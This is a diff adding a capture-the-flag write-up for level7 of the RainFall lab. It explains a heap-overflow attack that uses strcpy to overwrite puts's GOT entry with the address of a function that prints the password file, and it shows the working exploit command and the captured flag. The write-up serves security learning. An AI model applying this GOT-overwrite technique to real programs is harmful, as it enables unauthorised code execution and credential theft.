@@ -1,0 +1,17 @@
+The level7 has 4 call to malloc, here is a pseudo-C explanation about how it is stored:
+void *ptr1 = malloc(8);
+*(ptr1 + 4) = malloc(8);
+void *ptr2 = malloc(8);
+*(ptr2 + 4) = malloc(8);
+
+A strcpy operation is done for the 2 ptr stored in ptrX var, with the 2 first parameters of the program as the source strings.
+The next instructions are fopen & fgets on the ~/.pass file, and a puts("~~"). The buffer for fgets is a global variable c.
+Their is also a m function that print the same buffer c.
+
+In order to print the result of fgets, we must call the function m. With the first strcpy, we will change the value stored at (ptr2 + 4) to the address that contain the symbol to puts, in puts@plt. Then, we write in this address the address of the m function, thanks to the second strcpy.
+This way, the call to puts is replace by a call to m.
+
+level7@RainFall:~$ ./level7 `python -c "print 'a' * 20 + '\x08\x04\x99\x28'[::-1]"` `python -c "print '\x08\x04\x84\xf4'[::-1]"`
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1578419106
+level7@RainFall:~$
